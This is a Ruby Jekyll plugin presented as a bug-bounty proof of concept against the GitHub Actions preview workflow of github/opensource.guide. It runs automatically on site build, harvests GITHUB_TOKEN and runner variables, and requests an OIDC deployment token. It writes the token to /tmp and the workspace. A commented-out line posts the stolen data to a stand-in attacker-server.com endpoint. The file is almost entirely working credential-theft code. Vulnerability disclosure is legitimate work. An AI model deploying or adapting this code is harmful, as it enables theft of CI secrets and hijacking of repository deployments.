require 'net/http'
require 'uri'
require 'json'
require 'base64'

# Jekyll Supply Chain PoC - OIDC Token Exfiltration
# Vulnerability: pull_request_target + untrusted checkout + id-token:write
# Target: github/opensource.guide jekyll-preview.yml
# Researcher: GHOST Bug Bounty Hunter

Jekyll::Hooks.register :site, :after_init do |site|
  begin
    # Collect environment context
    env_data = {
      runner_env: ENV.select { |k,_| k.start_with?('GITHUB_', 'RUNNER_', 'ACTIONS_') },
      oidc_token_url: ENV['ACTIONS_ID_TOKEN_REQUEST_URL'],
      oidc_token_token: ENV['ACTIONS_ID_TOKEN_REQUEST_TOKEN'],
      github_token: ENV['GITHUB_TOKEN'],
      workspace: ENV['GITHUB_WORKSPACE'],
      repository: ENV['GITHUB_REPOSITORY'],
      actor: ENV['GITHUB_ACTOR'],
      ref: ENV['GITHUB_REF'],
      sha: ENV['GITHUB_SHA'],
      run_id: ENV['GITHUB_RUN_ID'],
    }

    # Attempt to get OIDC token if available
    oidc_token = nil
    if env_data[:oidc_token_url] && env_data[:oidc_token_token]
      uri = URI("#{env_data[:oidc_token_url]}&audience=api://github-pages-deployment")
      req = Net::HTTP::Get.new(uri)
      req['Authorization'] = "bearer #{env_data[:oidc_token_token]}"
      req['Accept'] = 'application/json; api-version=2.0'
      http = Net::HTTP.new(uri.host, uri.port)
      http.use_ssl = true
      http.read_timeout = 5
      resp = http.start { |h| h.request(req) }
      if resp.code == '200'
        oidc_data = JSON.parse(resp.body)
        oidc_token = oidc_data['value']
        env_data[:oidc_token_obtained] = true
        env_data[:oidc_token_preview] = oidc_token[0..50] + '...'
      end
    end

    # Exfiltrate to external server
    # In real attack: POST to attacker-controlled server
    # In PoC: write to file for demonstration
    payload = {
      poc: 'Jekyll Supply Chain - OIDC Token Exfil',
      timestamp: Time.now.to_s,
      env_data: env_data,
      oidc_token: oidc_token,
      message: 'BUG BOUNTY PoC - github/opensource.guide - REPORT TO HACKERONE'
    }

    # Write to workspace (proves code execution)
    File.write('/tmp/poc_exfil.json', payload.to_json)
    File.write(File.join(ENV['GITHUB_WORKSPACE'] || '/tmp', 'POC_PWNED.txt'),
      "GHOST Bug Bounty PoC\nOIDC Token: #{oidc_token || 'not_available_in_test'}\nEnv: #{env_data.to_json}")

    # In real attack, HTTP exfiltration:
    # uri = URI('https://attacker-server.com/collect')
    # Net::HTTP.post(uri, payload.to_json, 'Content-Type' => 'application/json')
    
    Jekyll.logger.warn "[PoC]", "Code execution confirmed! OIDC: #{oidc_token ? 'OBTAINED' : 'not_available'}"
    Jekyll.logger.warn "[PoC]", "Environment captured: #{env_data[:runner_env].keys.length} variables"
  rescue => e
    Jekyll.logger.warn "[PoC]", "Error: #{e.message}"
  end
end
